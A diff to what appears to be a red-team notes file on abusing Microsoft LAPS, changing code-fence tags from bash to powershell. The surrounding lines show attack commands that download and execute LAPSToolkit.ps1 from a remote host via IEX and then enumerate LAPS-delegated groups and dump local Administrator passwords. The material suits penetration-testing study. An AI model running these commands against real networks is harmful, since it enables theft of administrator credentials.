@@ -271,15 +271,15 @@ The Local Administrator Password Solution is intended to help administrators man
 These credentials are protected by group membership naturally. Explicit privileges to read LAPS data are needed. As is always the case with this sort of thing, there's every chance that this has been misconfigured.
 
 To enumerate groups with the privilege required to read LAPS data:
-```bash
+```powershell
 IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/LAPSToolkit.ps1')); Find-LAPSDelegatedGroups
 ```
 Get that groups membership:
-```bash
+```powershell
 Get-NetGroupMember -GroupName "<insert relevant group>"
 ```
 To retrieve the Administrator password:
-```bash
+```powershell
 IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/LAPSToolkit.ps1')); Get-LAPSComputers
 ```
 
